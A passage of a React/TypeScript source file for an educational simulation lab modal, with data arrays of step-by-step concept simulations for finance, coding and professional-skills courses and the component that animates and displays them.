      { title: 'DPDP CONSENT COMPLIANCE', description: 'Ensure zero telemetry or profiling scripts are loaded before verifiable parental consent is granted.' },
    ],
    didYouKnow: 'India\'s DPDP Act 2023 Section 9 strictly forbids behavioral tracking and targeted profiling directed at minors on educational platforms.',
  },
];

// 7. Finance & Markets Pack
export const FINANCE_SIMULATIONS: SimulationItem[] = [
  {
    id: 'fin-order-book-sim',
    name: 'Limit Order Book Matching Engine',
    subtitle: 'Continuous double auction mechanics, bid/ask depth spread, and clearing settlement.',
    category: 'FINANCE',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'ORDER-INGESTION', description: 'Traders dispatch Bid and Ask limit orders into exchange memory queues.' },
      { stepNumber: 2, tag: 'PRICE-TIME-PRIORITY', description: 'The order book sorts orders: best price first, then earliest timestamp.' },
      { stepNumber: 3, tag: 'SPREAD-MATCHING', description: 'When Bid price >= Ask price, matching engine executes transaction at prevailing price.' },
      { stepNumber: 4, tag: 'CASH-SETTLEMENT', description: 'Clearing house settles funds, updates custodial share registers, and emits trade tick.' },
    ],
    simplified: 'Like an automated marketplace where buyers and sellers state their target prices, and matches happen instantly when prices overlap.',
    defenseProtocols: [
      { title: 'PRE-TRADE RISK CONTROLS', description: 'Reject any order that exceeds available margin or violates daily position sizing rules.' },
      { title: 'SLIPPAGE GUARDS', description: 'Cancel market orders if market volatility moves execution price by more than 1.5% from quote.' },
      { title: 'AUDIT TRAIL LOGGING', description: 'Maintain microsecond-precision order logs for regulatory compliance and transparency.' },
    ],
    didYouKnow: 'Modern electronic financial exchanges match orders in under 15 microseconds, faster than a camera flash.',
  },
];

// 8. Coding & Logic Pack
export const CODING_SIMULATIONS: SimulationItem[] = [
  {
    id: 'code-sorting-visualizer',
    name: 'Sorting Algorithm Complexity Visualizer',
    subtitle: 'Comparing O(n²) quadratic comparisons against O(n log n) divide-and-conquer partitioning.',
    category: 'CODING',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'ARRAY-LOAD', description: 'Unsorted numerical elements are initialized into contiguous memory indices.' },
      { stepNumber: 2, tag: 'PIVOT-PARTITION', description: 'QuickSort selects a pivot element and partitions array into smaller and greater sub-segments.' },
      { stepNumber: 3, tag: 'RECURSIVE-SORT', description: 'Sub-arrays are sorted recursively in logarithmic depth, minimizing comparison operations.' },
      { stepNumber: 4, tag: 'ORDER-CONFIRMED', description: 'Monotonic ascending order is validated across all indices with zero data loss.' },
    ],
    simplified: 'Organizing a messy stack of cards by picking a middle card and placing lower cards on the left and higher cards on the right.',
    defenseProtocols: [
      { title: 'RANDOMIZED PIVOTS', description: 'Choose random pivots to prevent worst-case O(n²) degradation on pre-sorted data.' },
      { title: 'MAX RECURSION DEPTH', description: 'Cap recursion call depth to prevent Call Stack Overflow errors on massive datasets.' },
      { title: 'BOUNDARY GUARDS', description: 'Check array length before pointer access to eliminate out-of-bounds memory vulnerabilities.' },
    ],
    didYouKnow: 'Tony Hoare invented QuickSort in 1959, and it remains one of the fastest general-purpose sorting algorithms used in modern browsers.',
  },
];

// 9. Professional Skills Pack
export const PROFESSIONAL_SIMULATIONS: SimulationItem[] = [
  {
    id: 'prof-eisenhower-sim',
    name: 'Eisenhower Priority Matrix & Velocity',
    subtitle: 'Triage Urgent interruptions vs High-Impact strategic long-term capabilities.',
    category: 'PROFESSIONAL',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'TASK-CAPTURE', description: 'Log all incoming commitments and project milestones into structured inbox.' },
      { stepNumber: 2, tag: 'URGENCY-VS-IMPORTANCE', description: 'Evaluate genuine deadline pressure against long-term career capability impact.' },
      { stepNumber: 3, tag: 'QUADRANT-ALLOCATION', description: 'Sort tasks into Do First, Schedule, Delegate, or Eliminate bins.' },
      { stepNumber: 4, tag: 'DEEP-WORK-EXECUTION', description: 'Protect 90-minute ultradian focus blocks for Quadrant 2 strategic mastery.' },
    ],
    simplified: 'Focusing on the tasks that actually move your capabilities forward, rather than just reacting to whoever shouted loudest today.',
    defenseProtocols: [
      { title: 'CALENDAR TIME BLOCKING', description: 'Treat deep study and coding sessions as non-negotiable scheduled calendar commitments.' },
      { title: 'THE 2-MINUTE RULE', description: 'If an urgent administrative task takes under 2 minutes, complete it immediately rather than deferring.' },
      { title: 'BATCH PROCESSING', description: 'Inspect notifications and messaging only at dedicated intervals rather than continuously.' },
    ],
    didYouKnow: 'General Dwight D. Eisenhower used this exact priority system to coordinate the Allied invasion of Europe in 1944.',
  },
];

// Domain to Simulations Selector
export function getSimulationsForCourse(slug?: string, domain?: string, title?: string): SimulationItem[] {
  const s = (slug || '').toLowerCase();
  const d = (domain || '').toLowerCase();
  const t = (title || '').toLowerCase();

  if (s.includes('ai') || s.includes('artificial') || t.includes('ai') || t.includes('artificial')) {
    return AI_SIMULATIONS;
  }
  if (s.includes('blockchain') || s.includes('crypto') || t.includes('blockchain') || t.includes('crypto')) {
    return BLOCKCHAIN_SIMULATIONS;
  }
  if (s.includes('iot') || t.includes('iot') || s.includes('internet-of-things')) {
    return IOT_SIMULATIONS;
  }
  if (s.includes('microsoft') || t.includes('microsoft')) {
    return MICROSOFT_SIMULATIONS;
  }
  if (s.includes('privacy') || s.includes('footprint') || t.includes('privacy')) {
    return PRIVACY_SIMULATIONS;
  }
  if (d === 'finance' || s.includes('finance') || s.includes('stock') || s.includes('market') || s.includes('fintech')) {
    return FINANCE_SIMULATIONS;
  }
  if (d === 'coding' || s.includes('code') || s.includes('programming') || s.includes('web-dev') || s.includes('logic')) {
    return CODING_SIMULATIONS;
  }
  if (d === 'professional' || s.includes('time') || s.includes('soft') || s.includes('career') || s.includes('identity')) {
    return PROFESSIONAL_SIMULATIONS;
  }
  return CYBER_SIMULATIONS;
}

export interface SimulationLabModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialSimulationId?: string;
  courseTitle?: string;
  courseSlug?: string;
  domain?: string;
  onCompleteSimulation?: (simId: string) => void;
}

export const SimulationLabModal: React.FC<SimulationLabModalProps> = ({
  isOpen,
  onClose,
  initialSimulationId,
  courseTitle = 'Cybersecurity & Defensive Web Security',
  courseSlug = '',
  domain = '',
  onCompleteSimulation,
}) => {
  const [modalMode, setModalMode] = useState<'simulation' | 'sandbox'>('simulation');
  const courseSimulations = getSimulationsForCourse(courseSlug, domain, courseTitle);
  const [activeSimId, setActiveSimId] = useState<string>(initialSimulationId || courseSimulations[0].id);
  const [currentStep, setCurrentStep] = useState<number>(0);
  const [isPlaying, setIsPlaying] = useState<boolean>(true);
  const [completedSims, setCompletedSims] = useState<string[]>([]);

  // Update active simulation if list changes
  useEffect(() => {
    if (!courseSimulations.some((s) => s.id === activeSimId)) {
      setActiveSimId(courseSimulations[0].id);
      setCurrentStep(0);
    }
  }, [courseSlug, domain, courseTitle, activeSimId, courseSimulations]);

  // Find active simulation
  const activeSim = courseSimulations.find((s) => s.id === activeSimId) || courseSimulations[0];

  // Auto-step ticker when simulation is playing
  useEffect(() => {
    if (!isOpen || !isPlaying) return;
    const timer = setInterval(() => {
      setCurrentStep((prev) => {
        const next = (prev + 1) % activeSim.totalSteps;
        // Mark as completed if we cycle through all steps
        if (next === activeSim.totalSteps - 1 && !completedSims.includes(activeSim.id)) {
          setCompletedSims((old) => [...old, activeSim.id]);
          onCompleteSimulation?.(activeSim.id);
        }
        return next;
      });
    }, 2800);
    return () => clearInterval(timer);
  }, [isOpen, isPlaying, activeSim.id, activeSim.totalSteps, completedSims, onCompleteSimulation]);

  // Reset step when changing active simulation
  const handleSelectSim = (simId: string) => {
    setActiveSimId(simId);
    setCurrentStep(0);
    setIsPlaying(true);
  };

  const handleNextStep = () => {
    setCurrentStep((prev) => Math.min(prev + 1, activeSim.totalSteps - 1));
  };

  const handlePrevStep = () => {
    setCurrentStep((prev) => Math.max(prev - 1, 0));
  };

  const handleReset = () => {
    setCurrentStep(0);
    setIsPlaying(false);
  };

  if (!isOpen) return null;

  const currentStepData = activeSim.steps[currentStep] || activeSim.steps[0];
  const isSimCompleted = completedSims.includes(activeSim.id);

  return (
    <div
      style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: 'rgba(2, 6, 23, 0.88)',
        backdropFilter: 'blur(16px)',
        WebkitBackdropFilter: 'blur(16px)',
        zIndex: 1000,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '16px',
      }}
    >
      <div
        style={{
          width: '100%',
          maxWidth: '1280px',
          height: '92vh',
          backgroundColor: '#070C1E',
          border: '1px solid rgba(0, 240, 255, 0.25)',
          borderRadius: '20px',
          boxShadow: '0 25px 60px rgba(0, 0, 0, 0.8), 0 0 30px rgba(0, 240, 255, 0.15)',
          display: 'flex',
          flexDirection: 'column',
          overflow: 'hidden',
          color: '#FFFFFF',
        }}
      >
        {/* ============================================================== */}
        {/* 1. TOP HEADER (MATCHING IMAGE 2)                               */}
        {/* ============================================================== */}
        <header
          style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            padding: '16px 24px',
            borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
            backgroundColor: '#0B132B',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
            <div
              style={{
                width: '36px',
                height: '36px',
                borderRadius: '8px',
                border: '1.5px solid #EF4444',
                backgroundColor: 'rgba(239, 68, 68, 0.15)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#EF4444',
              }}
            >
              <Shield size={20} />
            </div>
            <div>
              <div style={{ fontWeight: 800, fontSize: '1.05rem', letterSpacing: '0.05em' }}>
                CYBER_LAB
              </div>
              <div style={{ fontSize: '0.78rem', color: '#94A3B8' }}>
                Select a threat to analyze • {courseTitle}
              </div>
            </div>
          </div>

          {/* Center Mode Selector & Badges */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            {/* Mode Switcher Tabs */}
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: '4px',
                backgroundColor: 'rgba(15, 23, 42, 0.75)',
                padding: '4px',
                borderRadius: '8px',
                border: '1px solid rgba(255, 255, 255, 0.1)',
              }}
            >
              <button
                type="button"
                onClick={() => setModalMode('simulation')}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px',
                  padding: '6px 12px',
                  borderRadius: '6px',
                  fontSize: '0.78rem',
                  fontWeight: 700,
                  cursor: 'pointer',
                  backgroundColor: modalMode === 'simulation' ? '#00F0FF' : 'transparent',
                  color: modalMode === 'simulation' ? '#070C1E' : '#94A3B8',
                  border: 'none',
                  transition: 'all 0.15s ease',
                }}
              >
                <Zap size={13} />
                <span>Concept Visualizer</span>
              </button>
              <button
                type="button"
                onClick={() => setModalMode('sandbox')}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px',
                  padding: '6px 12px',
                  borderRadius: '6px',
                  fontSize: '0.78rem',
                  fontWeight: 700,
                  cursor: 'pointer',
                  backgroundColor: modalMode === 'sandbox' ? '#00F0FF' : 'transparent',
                  color: modalMode === 'sandbox' ? '#070C1E' : '#94A3B8',
                  border: 'none',
                  transition: 'all 0.15s ease',
                }}
              >
                <Terminal size={13} />
                <span>Workable Sandbox</span>
              </button>
            </div>

            <span
              style={{
                padding: '4px 12px',
                borderRadius: '6px',
                backgroundColor: '#1E1B4B',
                color: '#A5B4FC',
                border: '1px solid rgba(165, 180, 252, 0.25)',
                fontSize: '0.75rem',
                fontWeight: 700,
                letterSpacing: '0.05em',
              }}
            >
              MODULE: {activeSim.name.toUpperCase()}
            </span>
          </div>

          {/* Close Button */}
          <button
            type="button"
            onClick={onClose}
            style={{
              width: '36px',
              height: '36px',
              borderRadius: '50%',
              backgroundColor: 'rgba(30, 41, 59, 0.8)',
              border: '1px solid rgba(255, 255, 255, 0.12)',
              color: '#94A3B8',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              cursor: 'pointer',
              transition: 'all 0.2s',
            }}
            title="Close Simulation Lab"
          >
            <X size={18} />
          </button>
        </header>

        {/* ============================================================== */}
        {/* 2. THREE-COLUMN WORKSPACE (MATCHING IMAGE 2)                   */}
        {/* ============================================================== */}
        <div style={{ flex: 1, display: 'flex', overflow: 'hidden' }}>
          {/* ========================================================== */}
          {/* LEFT COLUMN: SIMULATION TOPICS                             */}
          {/* ========================================================== */}
          <aside
            style={{
              width: '260px',
              borderRight: '1px solid rgba(255, 255, 255, 0.08)',
              backgroundColor: '#060B1C',
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'space-between',
              padding: '16px 12px',
              overflowY: 'auto',
            }}
          >
            <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
              <div style={{ fontSize: '0.72rem', color: '#64748B', fontWeight: 700, textTransform: 'uppercase', padding: '0 8px 8px', letterSpacing: '0.05em' }}>
                Simulations ({courseSimulations.length})
              </div>

              {courseSimulations.map((sim) => {
                const isActive = sim.id === activeSim.id;
                const isDone = completedSims.includes(sim.id);

                return (
                  <button
                    key={sim.id}
                    type="button"
                    onClick={() => handleSelectSim(sim.id)}
                    style={{
                      width: '100%',
                      padding: '10px 14px',
                      borderRadius: '8px',
                      backgroundColor: isActive ? '#252352' : 'transparent',
                      border: isActive ? '1px solid rgba(139, 92, 246, 0.4)' : '1px solid transparent',
                      color: isActive ? '#FFFFFF' : '#94A3B8',
                      fontWeight: isActive ? 700 : 500,
                      fontSize: '0.85rem',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      textAlign: 'left',
                      cursor: 'pointer',
                      transition: 'all 0.15s ease',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', overflow: 'hidden' }}>
                      {isDone ? (
                        <CheckCircle2 size={14} color="#10B981" style={{ flexShrink: 0 }} />
                      ) : (
                        <div style={{ width: '6px', height: '6px', borderRadius: '50%', backgroundColor: isActive ? '#A78BFA' : '#475569', flexShrink: 0 }} />
                      )}
                      <span style={{ whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                        {sim.name}
                      </span>
                    </div>
                    {isActive && <ChevronRight size={14} color="#A78BFA" />}
                  </button>
                );
              })}
            </div>

            {/* Exit Lab Button */}
            <div style={{ paddingTop: '16px', borderTop: '1px solid rgba(255, 255, 255, 0.08)' }}>
              <button
                type="button"
                onClick={onClose}
                style={{
                  width: '100%',
                  padding: '10px',
                  borderRadius: '8px',
                  backgroundColor: 'rgba(30, 41, 59, 0.6)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  color: '#CBD5E1',
                  fontWeight: 600,
                  fontSize: '0.85rem',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  cursor: 'pointer',
                }}
              >
                <LogOut size={16} />
                <span>Exit Lab</span>
              </button>
            </div>
          </aside>

          {/* ========================================================== */}
          {/* CENTER & RIGHT: WORKABLE SANDBOX OR CONCEPT VISUALIZER     */}
          {/* ========================================================== */}
          {modalMode === 'sandbox' ? (
            <main
              style={{
                flex: 1,
                padding: '24px 32px',
                display: 'flex',
                flexDirection: 'column',
                gap: '18px',
                overflowY: 'auto',
                backgroundColor: '#070D22',
              }}
            >
              <WorkableSandboxLab
                courseSlug={courseSlug}
                domain={domain}
                courseTitle={courseTitle}
              />
            </main>
          ) : (
            <>
              {/* CENTER COLUMN: INTERACTIVE CANVAS & STEP CONTROLS */}
              <main
                style={{
                  flex: 1,
                  padding: '24px 32px',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '18px',
                  overflowY: 'auto',
                  backgroundColor: '#070D22',
                }}
              >
                {/* Simulation Title & Description */}
                <div>
                  <h2 style={{ fontSize: '2rem', fontWeight: 800, color: '#FFFFFF', marginBottom: '8px' }}>
                    {activeSim.name}
                  </h2>
              <div
                style={{
                  borderLeft: '3px solid #3B82F6',
                  paddingLeft: '12px',
                  color: '#94A3B8',
                  fontSize: '0.95rem',
                  lineHeight: 1.5,
                }}
              >
                {activeSim.subtitle}
              </div>
            </div>

            {/* Matrix Green / Black Simulation Canvas */}
            <div
              style={{
                width: '100%',
                minHeight: '290px',
                backgroundColor: '#02040A',
                backgroundImage:
                  'linear-gradient(rgba(0, 245, 160, 0.06) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 245, 160, 0.06) 1px, transparent 1px)',
                backgroundSize: '24px 24px',
                borderRadius: '16px',
                border: '1px solid rgba(0, 240, 255, 0.2)',
                position: 'relative',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                overflow: 'hidden',
                padding: '20px',
              }}
            >
              {/* Status Indicator */}
              <div
                style={{
                  position: 'absolute',
                  top: '16px',
                  left: '16px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px',
                  fontSize: '0.72rem',
                  fontWeight: 700,
                  fontFamily: 'monospace',
                  color: currentStep === 3 ? '#10B981' : '#EF4444',
                  backgroundColor: currentStep === 3 ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)',
                  border: currentStep === 3 ? '1px solid rgba(16, 185, 129, 0.3)' : '1px solid rgba(239, 68, 68, 0.3)',
                  padding: '3px 10px',
                  borderRadius: '12px',
                }}
              >
                <div
                  style={{
                    width: '6px',
                    height: '6px',
                    borderRadius: '50%',
                    backgroundColor: currentStep === 3 ? '#10B981' : '#EF4444',
                    boxShadow: currentStep === 3 ? '0 0 8px #10B981' : '0 0 8px #EF4444',
                  }}
                />
                <span>{currentStep === 3 ? 'DEFENSE_PROTOCOL_ACTIVE' : 'ATTACK_IN_PROGRESS'}</span>
              </div>

              {/* Dynamic SVG Simulation Visualizer */}
              <svg viewBox="0 0 680 220" style={{ width: '100%', maxWidth: '640px', maxHeight: '240px' }}>
                <defs>
                  <linearGradient id="cyanGlow" x1="0%" y1="0%" x2="100%" y2="0%">
                    <stop offset="0%" stopColor="#00F5FF" stopOpacity="0.8" />
                    <stop offset="100%" stopColor="#00F5A0" stopOpacity="0.8" />
                  </linearGradient>
                  <filter id="glow">
                    <feGaussianBlur stdDeviation="3" result="coloredBlur" />
                    <feMerge>
                      <feMergeNode in="coloredBlur" />
                      <feMergeNode in="SourceGraphic" />
                    </feMerge>
                  </filter>
                </defs>

                {/* Left Actor: Sender / Attacker */}
                <g transform="translate(80, 70)">
                  <circle cx="25" cy="20" r="16" fill="#00E5FF" />
                  <path d="M 5,65 C 5,42 45,42 45,65 Z" fill="#00E5FF" />
                  <text x="25" y="85" fill="#94A3B8" fontSize="11" fontWeight="700" textAnchor="middle">
                    {currentStep < 3 ? 'Attacker' : 'Verified Sender'}
                  </text>
                </g>

                {/* Trajectory dashed path */}
                <path
                  d="M 140,95 Q 340,40 500,95"
                  fill="none"
                  stroke="#FBBF24"
                  strokeWidth="2.5"
                  strokeDasharray="6 4"
                  opacity={currentStep > 0 ? 0.9 : 0.4}
                />

                {/* Animated Flying Envelope or Payload (Matching Image 2) */}
                <g
                  transform={`translate(${
                    currentStep === 0 ? 150 : currentStep === 1 ? 280 : currentStep === 2 ? 420 : 490
                  }, ${currentStep === 0 ? 80 : currentStep === 1 ? 55 : currentStep === 2 ? 75 : 90})`}
                  style={{ transition: 'transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1)' }}
                >
                  <circle cx="20" cy="15" r="26" fill="none" stroke="#FDE047" strokeWidth="1.5" strokeDasharray="4 3" />
                  <rect x="5" y="3" width="30" height="22" rx="4" fill="#FFFFFF" filter="url(#glow)" />
                  <path d="M 5,5 L 20,16 L 35,5" fill="none" stroke="#0F172A" strokeWidth="2" />
                  <text x="20" y="37" fill="#FDE047" fontSize="9" fontWeight="800" textAnchor="middle">
                    {currentStep === 3 ? 'SHIELDED' : 'PAYLOAD'}
                  </text>
                </g>

                {/* Right Actor: Target Computer Monitor */}
                <g transform="translate(520, 60)">
                  <rect x="0" y="0" width="70" height="50" rx="6" fill="#0F172A" stroke="#00E5FF" strokeWidth="3.5" />
                  <rect x="6" y="6" width="58" height="38" rx="3" fill="#030712" />
                  <line x1="16" y1="20" x2="54" y2="20" stroke={currentStep >= 2 ? (currentStep === 3 ? '#10B981' : '#EF4444') : '#38BDF8'} strokeWidth="2.5" />
                  <line x1="16" y1="28" x2="42" y2="28" stroke={currentStep >= 2 ? (currentStep === 3 ? '#10B981' : '#EF4444') : '#38BDF8'} strokeWidth="2.5" />
                  {/* Stand */}
                  <rect x="30" y="50" width="10" height="15" fill="#00E5FF" />
                  <rect x="18" y="65" width="34" height="5" rx="2" fill="#00E5FF" />
                  <text x="35" y="85" fill="#94A3B8" fontSize="11" fontWeight="700" textAnchor="middle">
                    Recipient Device
                  </text>
                </g>

                {/* Defense Barrier Pop-up at Step 3 */}
                {currentStep === 3 && (
                  <g transform="translate(460, 45)">
                    <rect x="0" y="0" width="24" height="85" rx="6" fill="rgba(16, 185, 129, 0.25)" stroke="#10B981" strokeWidth="2.5" />
                    <text x="12" y="48" fill="#10B981" fontSize="14" fontWeight="800" textAnchor="middle">
                      ✓
                    </text>
                  </g>
                )}
              </svg>
            </div>

            {/* Simulation Controls Row (Matching Image 2) */}
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '12px',
                padding: '12px 18px',
                backgroundColor: '#0B132B',
                borderRadius: '12px',
                border: '1px solid rgba(255, 255, 255, 0.08)',
              }}
            >
              {/* Left: Reset Button */}
              <button
                type="button"
                onClick={handleReset}
                style={{
                  width: '38px',
                  height: '38px',
                  borderRadius: '50%',
                  backgroundColor: 'rgba(30, 41, 59, 0.8)',
                  border: '1px solid rgba(255, 255, 255, 0.12)',
                  color: '#94A3B8',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  cursor: 'pointer',
                }}
                title="Reset simulation to step 1"
              >
                <RotateCcw size={16} />
              </button>

              {/* Center: Play/Pause Button */}
              <button
                type="button"
                onClick={() => setIsPlaying(!isPlaying)}
                style={{
                  padding: '8px 22px',
                  borderRadius: '8px',
                  background: 'linear-gradient(135deg, #4F46E5 0%, #3B82F6 100%)',
                  border: 'none',
                  color: '#FFFFFF',
                  fontWeight: 700,
                  fontSize: '0.88rem',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  cursor: 'pointer',
                  boxShadow: '0 4px 14px rgba(79, 70, 229, 0.4)',
                }}
              >
                {isPlaying ? <Pause size={16} /> : <Play size={16} />}
                <span>{isPlaying ? 'PAUSE SIM' : 'PLAY SIM'}</span>
              </button>

              {/* Right: Step Indicator & Arrows */}
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                {/* Step indicator pills */}
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  {activeSim.steps.map((_, i) => (
                    <button
                      key={i}
                      type="button"
                      onClick={() => {
                        setCurrentStep(i);
                        setIsPlaying(false);
                      }}
                      style={{
                        width: i === currentStep ? '24px' : '8px',
                        height: '8px',
                        borderRadius: '4px',
                        backgroundColor: i === currentStep ? '#6366F1' : 'rgba(255, 255, 255, 0.2)',
                        border: 'none',
                        cursor: 'pointer',
                        transition: 'all 0.25s',
                      }}
                    />
                  ))}
                </div>

                <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                  <button
                    type="button"
                    onClick={handlePrevStep}
                    disabled={currentStep === 0}
                    style={{
                      width: '32px',
                      height: '32px',
                      borderRadius: '6px',
                      backgroundColor: 'rgba(30, 41, 59, 0.6)',
                      border: '1px solid rgba(255, 255, 255, 0.1)',
                      color: currentStep === 0 ? '#475569' : '#CBD5E1',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      cursor: currentStep === 0 ? 'not-allowed' : 'pointer',
                    }}
                  >
                    <ChevronLeft size={16} />
                  </button>
                  <button
                    type="button"
                    onClick={handleNextStep}
                    disabled={currentStep === activeSim.totalSteps - 1}
                    style={{
                      width: '32px',
                      height: '32px',
                      borderRadius: '6px',
                      backgroundColor: 'rgba(30, 41, 59, 0.6)',
                      border: '1px solid rgba(255, 255, 255, 0.1)',
                      color: currentStep === activeSim.totalSteps - 1 ? '#475569' : '#CBD5E1',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      cursor: currentStep === activeSim.totalSteps - 1 ? 'not-allowed' : 'pointer',
                    }}
                  >
                    <ChevronRight size={16} />
                  </button>
                </div>
              </div>
            </div>

            {/* Step Explanation Callout Box */}
            <div
              style={{
                backgroundColor: '#0B132B',
                border: '1px solid rgba(59, 130, 246, 0.3)',
                borderRadius: '12px',
                padding: '16px 20px',
                display: 'flex',
                alignItems: 'flex-start',
                gap: '14px',
              }}
            >
              <div
                style={{
                  width: '28px',
                  height: '28px',
                  borderRadius: '6px',
                  backgroundColor: 'rgba(59, 130, 246, 0.2)',
                  color: '#60A5FA',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  flexShrink: 0,
                  marginTop: '2px',
                }}
              >
                <Terminal size={16} />
              </div>
              <div>
                <div
                  style={{
                    fontSize: '0.78rem',
                    fontFamily: 'monospace',
                    fontWeight: 700,
                    color: '#60A5FA',
                    letterSpacing: '0.05em',
                    marginBottom: '4px',
                  }}
                >
                  STEP {currentStepData.stepNumber}: {currentStepData.tag}
                </div>
                <div style={{ fontSize: '0.92rem', color: '#E2E8F0', lineHeight: 1.5 }}>
                  {currentStepData.description}
                </div>
              </div>
            </div>
          </main>

          {/* ========================================================== */}
          {/* RIGHT COLUMN: PROTOCOLS, SIMPLIFIED, DID YOU KNOW?         */}
          {/* ========================================================== */}
          <aside
            style={{
              width: '320px',
              borderLeft: '1px solid rgba(255, 255, 255, 0.08)',
              backgroundColor: '#060B1C',
              display: 'flex',
              flexDirection: 'column',
              gap: '16px',
              padding: '20px 18px',
              overflowY: 'auto',
            }}
          >
            {/* 1. SIMPLIFIED Card */}
            <div
              style={{
                backgroundColor: '#0B132B',
                border: '1px solid rgba(255, 255, 255, 0.08)',
                borderRadius: '12px',
                padding: '14px 16px',
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
                <Zap size={16} color="#FBBF24" />
                <span style={{ fontSize: '0.78rem', fontWeight: 800, color: '#FBBF24', letterSpacing: '0.06em' }}>
                  SIMPLIFIED
                </span>
              </div>
              <p style={{ fontSize: '0.82rem', color: '#CBD5E1', lineHeight: 1.55 }}>
                {activeSim.simplified}
              </p>
            </div>

            {/* 2. DEFENSE PROTOCOLS Card */}
            <div
              style={{
                backgroundColor: '#0B132B',
                border: '1px solid rgba(16, 185, 129, 0.25)',
                borderRadius: '12px',
                padding: '14px 16px',
                display: 'flex',
                flexDirection: 'column',
                gap: '10px',
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Lock size={16} color="#34D399" />
                <span style={{ fontSize: '0.78rem', fontWeight: 800, color: '#34D399', letterSpacing: '0.06em' }}>
                  DEFENSE PROTOCOLS
                </span>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                {activeSim.defenseProtocols.map((proto, idx) => (
                  <div key={idx} style={{ fontSize: '0.8rem' }}>
                    <div style={{ fontWeight: 700, color: '#F8FAFC', marginBottom: '2px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <span style={{ color: '#10B981' }}>•</span>
                      <span>{proto.title}</span>
                    </div>
                    <div style={{ color: '#94A3B8', paddingLeft: '12px', fontSize: '0.78rem', lineHeight: 1.45 }}>
                      {proto.description}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* 3. DID YOU KNOW? Card */}
            <div
              style={{
                backgroundColor: '#0B132B',
                border: '1px solid rgba(255, 255, 255, 0.08)',
                borderRadius: '12px',
                padding: '14px 16px',
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
                <Hash size={16} color="#60A5FA" />
                <span style={{ fontSize: '0.78rem', fontWeight: 800, color: '#60A5FA', letterSpacing: '0.06em' }}>
                  DID YOU KNOW?
                </span>
              </div>
              <p style={{ fontSize: '0.8rem', color: '#94A3B8', lineHeight: 1.5 }}>
                {activeSim.didYouKnow}
              </p>
            </div>

            {/* 4. COMPLETION BADGE Card */}
            <div
              style={{
                backgroundColor: isSimCompleted ? 'rgba(16, 185, 129, 0.1)' : '#0B132B',
                border: isSimCompleted ? '1px solid #10B981' : '1px solid rgba(255, 255, 255, 0.08)',
                borderRadius: '12px',
                padding: '14px 16px',
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
                marginTop: 'auto',
              }}
            >
              <div
                style={{
                  width: '36px',
                  height: '36px',
                  borderRadius: '50%',
                  backgroundColor: isSimCompleted ? '#10B981' : 'rgba(30, 41, 59, 0.6)',
                  color: isSimCompleted ? '#FFFFFF' : '#64748B',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  flexShrink: 0,
                }}
              >
                <Award size={18} />
              </div>
              <div>
                <div style={{ fontSize: '0.78rem', fontWeight: 800, color: isSimCompleted ? '#34D399' : '#FFFFFF' }}>
                  {isSimCompleted ? 'SIMULATION MASTERED' : 'COMPLETION BADGE'}
                </div>
                <div style={{ fontSize: '0.72rem', color: '#94A3B8' }}>
                  {isSimCompleted ? '+50 XP Awarded • Ready for Next Threat' : 'Cycle through all 4 steps to verify mastery'}
                </div>
              </div>
            </div>
          </aside>
        </>
      )}
    </div>
  </div>
</div>
);
};
